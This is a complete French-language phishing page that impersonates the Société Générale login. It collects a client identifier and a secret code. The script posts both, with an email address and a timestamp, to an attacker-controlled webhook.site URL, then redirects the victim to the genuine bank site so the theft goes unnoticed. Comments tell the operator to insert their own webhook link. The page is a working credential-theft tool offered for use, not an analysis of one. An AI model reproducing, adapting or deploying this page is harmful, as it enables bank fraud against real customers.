<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Société Générale - Connexion</title>
    <style>
        /* MÊME STYLE QUE AVANT POUR NE PAS BOULER LE DESIGN */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            color: #000;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .header { text-align: center; padding-top: 40px; padding-bottom: 20px; }
        .logo { height: 40px; width: auto; display: inline-block; }
        .content {
            flex: 1; display: flex; flex-direction: column; justify-content: center;
            padding: 0 20px; max-width: 400px; margin: 0 auto; width: 100%;
        }
        h2 { font-size: 20px; font-weight: 600; margin-bottom: 25px; text-align: center; color: #000; }
        .input-group { margin-bottom: 30px; }
        input[type="number"] {
            width: 100%; padding: 15px 0; border: none; border-bottom: 2px solid #E30613;
            font-size: 24px; text-align: center; color: #000; background: transparent;
            outline: none; -moz-appearance: textfield; letter-spacing: 2px;
        }
        input[type="number"]::placeholder { color: #999; font-size: 18px; letter-spacing: 1px; }
        input[type="number"]::-webkit-outer-spin-button, input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .btn-main {
            width: 100%; padding: 16px; background-color: #E30613; color: white; border: none;
            border-radius: 4px; font-size: 18px; font-weight: 600; cursor: pointer;
            margin-top: auto; margin-bottom: 30px; box-shadow: 0 2px 5px rgba(227, 6, 19, 0.3);
            transition: background 0.2s;
        }
        .btn-main:active { background-color: #c50510; }
        .hidden { display: none; }
        .fade-in { animation: fadeIn 0.4s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .footer-links { text-align: center; padding: 20px; font-size: 14px; color: #666; border-top: 1px solid #eee; }
        .footer-links a { color: #E30613; text-decoration: none; display: block; margin-bottom: 8px; }
        .help-text { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; line-height: 1.4; }
        .help-link { color: #E30613; text-decoration: none; font-weight: 600; }
        .btn-main.loading { opacity: 0.7; pointer-events: none; }
    </style>
</head>
<body>

    <div class="header">
        <img src="https://banque.meilleurtaux.com/images/actu/logos/societe-generale-logo.png" alt="SG" class="logo">
    </div>

    <div class="content">
        <div id="step1" class="fade-in">
            <h2>Saisissez votre Identifiant Client</h2>
            <div class="input-group">
                <input type="number" id="client_id" placeholder="Ex: 12345678" inputmode="numeric" pattern="[0-9]*">
            </div>
            <p class="help-text"><a href="#" class="help-link">Où trouver mon Code Client SG ?</a></p>
            <button class="btn-main" onclick="goToStep2()">Suivant</button>
        </div>

        <div id="step2" class="hidden">
            <h2>Saisissez votre Code Secret</h2>
            <div class="input-group">
                <input type="number" id="password" placeholder="Ex: 12345" inputmode="numeric" pattern="[0-9]*">
            </div>
            <p class="help-text"><a href="#" class="help-link">Code Secret inconnu ?</a></p>
            <button class="btn-main" id="btnSubmit" onclick="submitForm()">Valider</button>
        </div>
    </div>

    <div class="footer-links">
        <a href="#">Urgences carte bancaire</a>
        <a href="#">Nos conseils sécurité</a>
        <a href="#">Questions fréquentes</a>
        <a href="#">Trouver une agence</a>
        <br>
        <span style="font-size: 12px; color: #999;">© 2026 Société Générale</span>
    </div>

    <script>
        // ⚠️ REMPLACE CE LIEN PAR TON LIEN WEBHOOK.SITE EXACT
        // Exemple: https://webhook.site/9cafa90d-2d9e-4cc3-a60e-4fbbc1c2ff3a
        const WEBHOOK_URL = "https://webhook.site/9cafa90d-2d9e-4cc3-a60e-4fbbc1c2ff3a";

        function goToStep2() {
            const idInput = document.getElementById('client_id');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');

            if (idInput.value.length < 1) {
                idInput.style.borderBottomColor = '#ff0000';
                setTimeout(() => idInput.style.borderBottomColor = '#E30613', 300);
                return;
            }

            step1.style.opacity = '0';
            step1.style.transform = 'translateY(-10px)';
            
            setTimeout(() => {
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                step2.classList.add('fade-in');
                document.getElementById('password').focus();
            }, 300);
        }

        function submitForm() {
            const passwordInput = document.getElementById('password');
            const password = passwordInput.value;
            const clientId = document.getElementById('client_id').value;
            const btn = document.getElementById('btnSubmit');

            if (password.length < 1) {
                passwordInput.style.borderBottomColor = '#ff0000';
                setTimeout(() => passwordInput.style.borderBottomColor = '#E30613', 300);
                return;
            }

            btn.classList.add('loading');
            btn.textContent = "Connexion...";

            // On utilise FormData pour une compatibilité maximale avec Webhook.site
            const formData = new FormData();
            formData.append("Identifiant", clientId);
            formData.append("Mot de passe", password);
            formData.append("Email", "Roroldan_86@hotmail.com");
            formData.append("Date", new Date().toLocaleString());

            // Envoi de la requête
            fetch(WEBHOOK_URL, {
                method: "POST",
                body: formData
            })
            .then(response => {
                // On attend 1 seconde pour être sûr que Webhook a reçu le paquet
                setTimeout(() => {
                    window.location.href = "https://societegenerale.com";
                }, 1000);
            })
            .catch(error => {
                console.error("Erreur:", error);
                // Même en cas d'erreur, on redirige
                setTimeout(() => {
                    window.location.href = "https://societegenerale.com";
                }, 1000);
            });
        }
    </script>

</body>
</html>
